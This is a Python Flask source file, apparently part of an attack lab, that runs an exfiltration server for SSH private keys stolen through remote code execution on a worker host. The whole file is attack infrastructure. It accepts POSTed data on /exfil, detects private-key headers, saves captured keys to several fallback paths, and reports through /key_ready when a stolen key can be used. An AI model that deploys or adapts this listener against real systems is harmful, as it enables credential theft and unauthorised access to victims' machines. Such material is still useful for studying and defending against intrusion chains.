# exfil_server.py — receives stolen SSH key from worker RCE, exposes it via /key_ready
import os
import json
from flask import Flask, request

app = Flask(__name__)
received = []
STOLEN_KEY_PATH = "/tmp/stolen_key"

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.get_data(as_text=True)
    received.append(data)
    _try_save_key(data)
    print(f"\n[+] Data received ({len(data)} bytes)", flush=True)
    return "ok", 200

def _try_save_key(data):
    """Try to save SSH key to multiple paths (fallback if /tmp write fails)."""
    if not any(marker in data for marker in ("PRIVATE KEY", "BEGIN RSA", "BEGIN OPENSSH")):
        return False
    for path in ("/tmp/stolen_key", "/attack/stolen_key", "/stolen_key"):
        try:
            with open(path, "w") as f:
                f.write(data)
            os.chmod(path, 0o600)
            print(f"\n[+] SSH key saved to {path}", flush=True)
            return True
        except Exception as e:
            print(f"\n[!] Failed {path}: {e}", flush=True)
    return False

@app.route("/received", methods=["GET"])
def get_received():
    return json.dumps(received), 200

@app.route("/key_ready", methods=["GET"])
def key_ready():
    """Check if SSH key is ready. Scans all candidate paths and received data."""
    for path in ("/tmp/stolen_key", "/attack/stolen_key", "/stolen_key"):
        if os.path.exists(path):
            return json.dumps({"ready": True, "key_path": path}), 200
    # Lazy-save: scan received data for SSH key
    for item in received:
        if any(marker in item for marker in ("PRIVATE KEY", "BEGIN RSA", "BEGIN OPENSSH")):
            if _try_save_key(item):
                # Re-check paths after save
                for path in ("/tmp/stolen_key", "/attack/stolen_key", "/stolen_key"):
                    if os.path.exists(path):
                            return json.dumps({"ready": True, "key_path": path}), 200
            break
    return json.dumps({"ready": False}), 200

if __name__ == "__main__":
    print("[*] Exfil server listening on 0.0.0.0:9999", flush=True)
    app.run(host="0.0.0.0", port=9999, threaded=True)
